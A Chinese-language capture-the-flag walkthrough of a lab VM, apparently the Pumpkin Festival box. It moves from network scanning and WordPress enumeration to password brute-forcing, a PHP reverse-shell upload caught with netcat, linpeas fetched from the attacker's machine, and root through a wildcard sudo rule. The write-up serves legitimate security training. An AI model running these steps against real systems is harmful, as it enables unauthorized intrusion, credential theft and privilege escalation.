1. 掃描網段
    ```
    $ sudo netdiscover -i eth0
    Currently scanning: 172.16.137.0/16   |   Screen View: Unique Hosts  
    35 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 2100 
    ___________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname
    ___________________________________________________________________________
     192.168.163.1   00:50:56:c0:00:08     30    1800  VMware, Inc.        
     192.168.163.2   00:50:56:f4:a6:3d      2     120  VMware, Inc. 
     192.168.163.132 00:0c:29:8a:04:98      1      60  VMware, Inc.
     192.168.163.254 00:50:56:e2:ec:4c      2     120  VMware, Inc. 
    ```
2. 掃描 IP
    ```
    $ nmap 192.168.163.132 -sV   
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 03:39 EDT
    Nmap scan report for 192.168.163.132
    Host is up (0.00025s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 2.0.8 or later
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    MAC Address: 00:0C:29:8A:04:98 (VMware)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
    ```
3. 確認自己的 IP
    ```
    $ ifconfig      
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.163.128  netmask 255.255.255.0  broadcast 192.168.163.255
            inet6 fe80::5e61:43ea:ac9b:5c07  prefixlen 64  scopeid 0x20<link>
            ether 00:0c:29:df:e7:89  txqueuelen 1000  (Ethernet)
            RX packets 1242  bytes 115233 (112.5 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 101137  bytes 6079712 (5.7 MiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 8  bytes 480 (480.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 8  bytes 480 (480.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    ```
4. 看網頁端 `http://192.168.163.132`
![image](https://hackmd.io/_uploads/H1Iuog8weg.png)
5. 對網頁做目錄遍歷
    ```
    $ dirb http://192.168.163.132    

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Tue Jul 29 03:43:15 2025
    URL_BASE: http://192.168.163.132/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: http://192.168.163.132/ ----
    ==> DIRECTORY: http://192.168.163.132/img/                                                                                                                
    + http://192.168.163.132/index.html (CODE:200|SIZE:1465)                                                                                                  
    + http://192.168.163.132/robots.txt (CODE:200|SIZE:102)                                                                                                   
    + http://192.168.163.132/server-status (CODE:403|SIZE:295)                                                                                                
    ==> DIRECTORY: http://192.168.163.132/store/                                                                                                              
    ==> DIRECTORY: http://192.168.163.132/users/                                                                                                              

    ---- Entering directory: http://192.168.163.132/img/ ----
    + http://192.168.163.132/img/favicon.ico (CODE:200|SIZE:1406)                                                                                             

    ---- Entering directory: http://192.168.163.132/store/ ----

    ---- Entering directory: http://192.168.163.132/users/ ----

    -----------------
    END_TIME: Tue Jul 29 03:43:27 2025
    DOWNLOADED: 18448 - FOUND: 4
    ```
6. 查看 `robots.txt` 頁面，`http://192.168.163.132/robots.txt`
![image](https://hackmd.io/_uploads/Sk972lUwgl.png)
7. `http://192.168.163.132/store/track.txt`
![image](https://hackmd.io/_uploads/rJdn3gLvxg.png)
8. 以訪客身分連線 `ftp://192.168.163.132` (port 21)，拿到第一支 token
![image](https://hackmd.io/_uploads/r1hwhW8Deg.png)
    ```
    PumpkinToken : 2d6dbbae84d724409606eddd9dd71265
    ```
9. 查看網頁原始法發現第二支 token
![image](https://hackmd.io/_uploads/rJSezGUvle.png)
    ```
    PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52
    ```
10. 雖然 `http://192.168.163.132/tokens` 訪問不了，但可以試試看不同目錄，像 `/tokens/token.txt`、`/tokens/token1.txt` 等等，因此也發現第三支 token
![image](https://hackmd.io/_uploads/B1MSN9ODgx.png)
    ```
    PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea
    ```
11. 將 harry.pumpkins.local 加入到我的 `/etc/hosts` 檔案中
    ```
    $ echo "192.168.163.132 pumpkins.local harry.pumpkins.local" | sudo tee -a /etc/hosts
    [sudo] password for jolin: 
    192.168.163.132 pumpkins.local harry.pumpkins.local
    ```
12. `harry.pumpkins.local` 回傳了跟主頁一樣的內容。這表示子域名 `harry.pumpkins.local` 是有效的
![image](https://hackmd.io/_uploads/SyuXEzUvex.png)
13. `http://pumpkins.local` 找到 wordpress 設計的網站
    ```
    $ curl http://pumpkins.local                       
    <!DOCTYPE html>
    <html lang="en-US" class="no-js no-svg">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="profile" href="http://gmpg.org/xfn/11">
    .
    .
    .
    .
    ```
14. 執行 `wpscan`，枚舉使用者、主題和外掛來尋找突破口。
    ```
    $ wpscan --url http://pumpkins.local --enumerate u,t,p
    ```
    ![image](https://hackmd.io/_uploads/S1ICQ8_veg.png)
    找到兩個使用者 : morse 和 admin
    ![image](https://hackmd.io/_uploads/H1CrhPdPee.png)
    一些可造訪的路徑
15. 使用 wpscan 對找到的兩個使用者進行密碼暴力破解
    ```
    $ wpscan --url http://pumpkins.local -U morse,admin -P /usr/share/wordlists/rockyou.txt
    ```
    - 超級久...有兩千多萬筆 payload
16. 利用剛剛爆出的目錄中的註冊網頁進入登入頁面
![image](https://hackmd.io/_uploads/SyCLpPuDxe.png)
嘗試使用網站首頁的提示登入 `admin:Alohomora!`，幸好成功了
![image](https://hackmd.io/_uploads/rkCJ0P_vge.png)
17. 在首頁看到第四支 token
![image](https://hackmd.io/_uploads/r1jPdKODgl.png)
    ```
    PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4
    ```
18. 在 User profile 中看到 admin 跟 morse 頁面有第五支與第六支 token
![image](https://hackmd.io/_uploads/BJ0lPFOvxl.png)
    ```
    PumpkinToken : 06c3eb12ef2389e2752335beccfb2080
    ```
    ![image](https://hackmd.io/_uploads/Hyng3F_wxg.png)
    ```
    PumpkinToken : 7139e925fd43618653e51f820bc6201b
    ```
19. 在之前的 wpscan 掃描中得到了一個線索，表示可以像瀏覽資料夾一樣，直接在瀏覽器中打開這個目錄來查看裡面的所有檔案和資料夾
![image](https://hackmd.io/_uploads/Syyhuq_Pee.png)
20. 在 Plugins 頁面將寫好的[反向 shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 上傳
![image](https://hackmd.io/_uploads/S1jnYc_Dxx.png)
21. 果然看到出現在 `http://pumpkins.local/wp-content/uploads/2025/07/`
![image](https://hackmd.io/_uploads/Sysdc9uDge.png)
22. 攻擊端監聽
    ```
    $ nc -lvnp 4444
    ```
    執行 shell
    ```
    $ curl "http://pumpkins.local/wp-content/uploads/2025/07/shell-1.php" 
    ```
    反彈成功
![image](https://hackmd.io/_uploads/Bk5Ln9dvge.png)
23. 目前的 Shell 是一個非互動式的簡易 Shell，功能有限，需要先把它升級成一個功能完整的 TTY Shell
    ```
    listening on [any] 4444 ...
    connect to [192.168.163.128] from (UNKNOWN) [192.168.163.132] 43588
    Linux pumpkin 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
     13:00:39 up  5:42,  0 users,  load average: 0.00, 0.01, 0.05
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    ```
    升級 shell
    ```
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    ```
    ![image](https://hackmd.io/_uploads/Hk2QC9dPgx.png)
24. 攻擊端監聽
    ```
    $ python -m http.server
    ```
    受害端下載 `linpeas.sh`
    ```
    $ wget http://192.168.163.128:8000/linpeas.sh -O /tmp/linpeas.sh
    ```
    加權並開始掃描
    ```
    $ chmod +x linpeas.sh
    $ ./linpeas.sh
    ```
25. 在第 14 步驟的時候有掃描出來一個路徑 `http://pumpkins.local/readme.html`
![image](https://hackmd.io/_uploads/SkpqX2uDxe.png)
    將這串 base62 編碼解碼結果發現 jack 與 morse的密碼
![image](https://hackmd.io/_uploads/SJp7E3dPll.png)
    ```
    morse & jack : Ug0t!TrIpyJ
    ```
26. 登入 jack 帳號
    ```
    $ su jack
    ```
    列出目前使用者可以透過 sudo 執行的所有指令
    ```
    $ sudo -l
    ```
    ![image](https://hackmd.io/_uploads/H1_342Owee.png)
    * 最後一行意思是使用者 jack 可以使用 `sudo`。他可以作為任何使用者 (`ALL`)，預設是 `root`。他可以執行的命令是位於 `/home/jack/pumpkins/` 目錄下，任何以 `alohomora` 開頭的檔案 (`alohomora*`)。
    * 這個星號 * (萬用字元) 是提權的關鍵。如此就可以自己建立一個以 `alohomora` 開頭的惡意腳本，然後用 `sudo` 來執行它，從而獲得 `root shell`。
27. 創建並進入 `pumpkins` 資料夾
    ```
    $ mkdir pumpkins
    $ cd pumpkins
    ```
    建立惡意腳本
    ```
    $ echo "/bin/bash" > alohomora-shell
    ```
    執行腳本提權
    ```
    $ sudo ./alohomora-shell
    ```
28. 進入 `root` 資料夾
![image](https://hackmd.io/_uploads/BJRYw2uwgg.png)
    ```
    # cat PumpkinFestival_Ticket
    ```
    印出 flag
![image](https://hackmd.io/_uploads/rJ-Lu3uPge.png)
